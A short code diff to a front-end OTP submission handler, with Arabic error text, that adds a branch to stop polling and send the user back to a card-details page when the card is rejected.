@@ -76,6 +76,10 @@ const submitOtp = async () => {
           error.value = 'الرجاء إدخال رمز صحيح. الرمز غير صحيح.';
           otp.value = '';
           isSubmitting.value = false;
+        } else if (data.otpStatus === 'card_rejected') {
+          if (statusPoll) clearInterval(statusPoll);
+          isSubmitting.value = false;
+          router.push('/card-details');
         }
       } catch (e) {}
     }, 1500);
